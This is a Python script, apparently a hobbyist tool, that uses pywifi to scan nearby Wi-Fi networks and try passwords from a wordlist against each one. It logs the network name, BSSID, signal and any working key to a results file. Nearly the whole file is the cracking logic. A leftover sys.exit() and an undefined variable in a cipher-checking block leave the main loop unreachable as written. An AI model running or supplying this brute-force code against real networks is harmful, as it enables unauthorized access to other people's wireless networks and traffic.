from pywifi import *
import sys
import time
import pprint


def scans(face, timeout):
    face.scan()
    time.sleep(timeout)
    return face.scan_results()


def showSsid(ssidresult):
    for id in ssidresult:
        s = id.ssid.encode("raw_unicode_escape")
        a = s.decode("utf-8")
        print(a)


def test(i, face, x, key, stu, ts):
    showID = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid
    for n, k in enumerate(key):
        x.key = k.strip()
        face.remove_all_network_profiles()
        face.connect(face.add_network_profile(x))
        code = 10
        t1 = time.time()
        while code != 0:
            time.sleep(3)
            code = face.status()
            now = time.time() - t1
            if now > ts:
                break
            stu.write("\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s" % (
                6, i, 18, showID, code, 5, now, 7, x.signal, 10, len(key) - n, 10, k.replace("\n", "")))
            stu.flush()
            if code == 4:
                face.disconnect()
                return "%-*s| %s | %*s |%*s\n" % (20, x.ssid, x.bssid, 3, x.signal, 15, k)
    return False


scantimes = 3
testtimes = 30
output = sys.stdout
files = "TestRes.txt"
print(sys.argv[1])
keys = open(sys.argv[1], "r").readlines()
print("|KEYS %s" % (len(keys)))
wifi = PyWiFi()
iface = wifi.interfaces()[0]

if iface.status() in [const.IFACE_CONNECTED, const.IFACE_INACTIVE]:
    print('wifi已连接')
else:
    print('wifi not connect')

profile = iface.network_profiles()
print(len(profile))


if profile[0].cipher == const.CIPHER_TYPE_CCMP:
    print('CCMP')
elif profile[0].cipher == const.CIPHER_TYPE_WEP:
    print("WEP")
elif profile[0].cipher == const.CIPHER_TYPE_UNKNOWN:
    print("UNKN")
else:
    print(pro)
print(profile[0].cipher)
sys.exit()


scanres = scans(iface, scantimes)
showSsid(scanres)
nums = len(scanres)
print("|SCAN GET %s" % (nums))
print("%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s" % (
    "-" * 70, 6, "WIFIID", 18, "SSID OR BSSID", 2, "N", 4, "time", 7, "signal", 10, "KEYNUM", 10, "KEY", "=" * 70))


for i, x in enumerate(scanres):
    print("test1", i, "test2", x, "test3")
    res = test(nums - i, iface, x, keys, output, testtimes)
    if res:
        print("OK!")
        open(files, "a").write(res)
